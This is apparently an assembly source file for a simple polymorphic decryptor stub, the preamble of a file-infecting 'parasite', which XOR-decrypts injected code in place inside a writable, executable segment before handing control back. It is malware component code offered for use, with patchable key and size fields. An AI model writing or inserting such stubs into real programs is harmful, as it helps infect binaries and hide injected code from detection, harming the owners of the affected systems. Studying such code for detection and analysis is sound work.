BITS 32

; x86_64 polymorphic preamble
; very primitive polymorphism, simply decrypts
; the parasite with a one-byte xor key

; this preamble writes directly into the segment
; which the parasite was injected, as a consequence
; that segment must be both writable and executable

pusha ; preserve registers

jmp short begin
dummy:
    jmp ret

begin:
    xor eax, eax
    xor edi, edi
    xor esi, esi
    mov eax, 0x00000000; key

call dummy
ret:
    pop ebx   ; 64bit difference here
mov esi, 0x00000000; size
add ebx, 28; offset to code (not a parameter)

decrypt:
    xor [ebx+edi], eax ; 64bit difference again
    inc edi 
    cmp edi, esi
    jl decrypt

popa ; restore registers
